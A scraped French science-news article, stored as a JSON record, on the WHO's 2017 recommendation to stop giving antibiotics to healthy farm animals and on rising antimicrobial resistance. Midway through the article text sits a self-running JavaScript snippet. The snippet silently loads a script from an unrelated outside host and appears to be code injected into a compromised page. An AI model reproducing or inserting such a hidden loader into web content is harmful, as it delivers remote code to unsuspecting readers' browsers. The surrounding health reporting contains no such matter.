{"title": "Alimentation animale : l'OMS demande une reduction des antibiotiques", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-11-09", "content": "L'OMS recommande de ne plus utiliser d'antibiotiques chez les animaux d'elevage en bonne sante. De telles pratiques, qui visent a favoriser la croissance et a eviter des maladies chez des animaux, favorisent l'antibioresistance. Ce qu'il faut retenir Mieux vaut ne pas utiliser d'antibiotiques pour les animaux sains, estime l'Organisation mondiale de la sante (OMS). L'usage excessif d'antibiotiques dans les elevages accroit les resistances chez les bacteries. Les eleveurs et les consommateurs de viande mal cuite risquent d'acquerir des bacteries resistantes. Pour preserver l'efficacite des  antibiotiques  en medecine humaine, l'Organisation mondiale de la sante ( OMS ) demande que leur usage soit restreint aussi chez les animaux. Car, comme l'explique Tedros Adhanom Ghebreyesus, directeur general de l'OMS, dans un  communique ,  << un manque d'antibiotiques efficaces est une menace pour la securite sanitaire aussi grave qu'une flambee soudaine d'une maladie mortelle >>.  En effet, selon certaines previsions, en 2050, il pourrait y avoir 50 millions de morts par an dans le monde a cause de la resistance aux antimicrobiens. \" Le volume d'antibiotiques utilises chez les animaux continue de croitre partout dans le monde. Dans certains pays, 80 % des antibiotiques sont consommes par des animaux. Kazuaki Miyagishima, directeur du departement Securite sanitaire des aliments, zoonoses et maladies d'origine alimentaire a l'OMS, explique :  << Le volume d' antibiotiques  utilises chez les animaux continue de croitre partout dans le monde, sous l'effet de la demande grandissante en aliments d'origine animale, provenant souvent d'elevages intensifs >> . Or, cette surconsommation contribue a la montee de l'antibioresistance en medecine veterinaire et humaine. En effet, les antibiotiques donnes aux animaux sont proches de ceux utilises chez l'Homme. Les  bacteries  resistantes peuvent passer de l'animal a l'Homme par la consommation de viande non cuite, par contact etroit entre l'Homme et l'animal ou encore par de l'eau contaminee.  Une recherche parue dans  The Lancet Planetary Health  a directement inspire ces nouvelles recommandations de l'OMS. Cette revue d'articles basee sur 81 etudes a trouve que des interventions limitant l'usage des antibiotiques dans les elevages reduisaient la resistance des  bacteries .  Les bacteries peuvent acquerir des resistances par mutation. Souvent, les genes de resistance se trouvent sur des plasmides (des ADN circulaires) qui peuvent s'echanger entre bacteries. (c) psdesign1, Fotolia                               Les bacteries resistantes passent de l'animal a l'Homme En rassemblant tous les resultats, les auteurs ont trouve que la restriction des antibiotiques reduisait la prevalence de l'antibioresistance chez les animaux de 10 a 15 % en moyenne (allant de 0 a 39 %). Cela dependait de la classe d'antibiotiques et des bacteries. Pour les bacteries multiresistantes, la restriction des antibiotiques diminuait de 24 a 32 % la prevalence de ces bacteries chez les animaux. Les scientifiques ont aussi regarde si la reduction des antibiotiques dans les elevages diminuait la prevalence des  resistances  chez les bacteries de l'Homme. Ils ont trouve que la resistance aux antibiotiques diminuait de 24 %, mais surtout chez les personnes en contact direct avec les animaux.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Pour ces raisons, l'OMS recommande donc une reduction generale de l'usage des antibiotiques dans l'elevage. Les animaux en bonne sante ne devraient en recevoir que pour prevenir des maladies deja detectees dans le meme elevage. De preference, les animaux malades devraient etre testes pour selectionner le traitement antibiotique approprie. Les alternatives aux antibiotiques sont une meilleure hygiene, la vaccination et l'amelioration des conditions d'elevage. Le saviez-vous ? De nombreux pays ont deja pris des mesures pour reduire l'usage des antibiotiques dans les elevages. Depuis 2006, l'Union europeenne interdit l'utilisation d'antibiotiques pour la croissance.  Il y a urgence a agir. Certaines bacteries responsables d'infections chez l'Homme ont deja developpe des resistances a presque tous les traitements disponibles ; il existe relativement peu de nouveaux antibiotiques en test dans les laboratoires pharmaceutiques.  Pour en savoir plus L'OMS est pessimiste devant les resistances aux antibiotiques Article de AFP-Relax paru le 6 mai 2014 L'heure est grave : les bacteries s'adaptent aux traitements et les antibiotiques sont de moins en moins efficaces. Dans son dernier rapport sur le sujet, l'Organisation mondiale de la sante (OMS) dresse un bilan plutot alarmiste.  Les  resistances aux antibiotiques  s'etendent dangereusement a travers le monde. Pour l' OMS , ce phenomene constitue desormais une grave menace pour la sante publique. Pourra-t-on toujours traiter des infections que l'on combat facilement aujourd'hui avec des antibiotiques ? Dans un rapport publie recemment, l'OMS se montre tres pessimiste. Elle revele en effet que ce peril n'est plus une prevision : de nombreuses bacteries, efficacement combattues jusqu'a present par des antibiotiques, y sont devenues resistantes. Dans certains cas, les traitements de dernier recours ne fonctionnent plus et les taux de mortalite due a ces  microbes  tres resistants (les  superpathogenes ) augmentent dans certains pays. Les medecins se retrouvent de plus en plus impuissants face aux infections. Un exemple est celui de  Klebsiella  pneumoniae , une bacterie a l'origine de nombreuses  infections nosocomiales  pouvant conduire a une  pneumonie  ou une  septicemie . Or, cette  espece  a developpe une resistance aux carbapenemes, des antibiotiques utilises pour la combattre. Les consequences font froid dans le  dos  : chez plus de la moitie des patients contamines par  Klebsiella pneumoniae , le traitement antibiotique est inefficace. Les auteurs du rapport mettent aussi en avant les resistances aux  fluoroquinolones , des antibiotiques tres utilises contre les  infections urinaires  dues a  Escherichia coli . Comme de nombreuses autres especes, le staphylocoque dore est de plus en plus resistant aux antibiotiques. Le Sarm, ou  Staphylococcus aureus  resistant a la meticilline, est responsable d'environ 20.000 deces chaque annee aux Etats-Unis. On peut en apercevoir ici quelques representants (en jaune), accompagnes d'un neutrophile mort (en rouge). (c) NIAID, Flickr, CC by 2.0                               Vers une ere post-antibiotique ? La liste des antibiotiques pour lesquels les microbes ont developpe des resistances est longue.  << Exposes a des  bacteries  comme  Staphylococcus aureus  (le  staphylocoque dore ), les patients sont malades plus longtemps et ont plus de risque de deceder >> , poursuit l'OMS.  << A moins que les nombreux acteurs concernes agissent d'urgence et de maniere coordonnee, le monde s'achemine vers une ere post-antibiotique , estime Keiji Fukuda, sous-directeur general de l'OMS pour la securite sanitaire.  Des infections courantes et des blessures mineures qui sont soignees depuis des decennies pourraient a nouveau tuer. >> Ce constat concerne les 114 pays analyses par ce rapport. Dans certaines regions du monde, le traitement par les antibiotiques classiques est devenu inefficace.  << En Afrique, jusqu'a 80 % des infections a  staphylocoque dore  se sont ainsi averees resistantes a la meticilline ( Sarm ). >>  Pour lutter contre cette evolution dangereuse, l'OMS rappelle quelques recommandations : utilisez les antibiotiques uniquement lorsqu'ils vous sont prescrits par un medecin ; terminez toujours le traitement conformement a l'ordonnance, meme si vous vous sentez mieux ; ne partagez jamais des  antibiotiques  avec d'autres personnes et n'utilisez jamais les medicaments restants d'une ordonnance precedente. La resistance des bacteries aux antibiotiques, une menace grandissante                       Les antibiotiques possedent la propriete de tuer ou de limiter la propagation des bacteries. Or, certaines ne reagissent plus aux traitements. Dans cet episode, Patrice Courvalin explique les trois grands mecanismes du processus de resistance.                                       ", "theme": "sante"}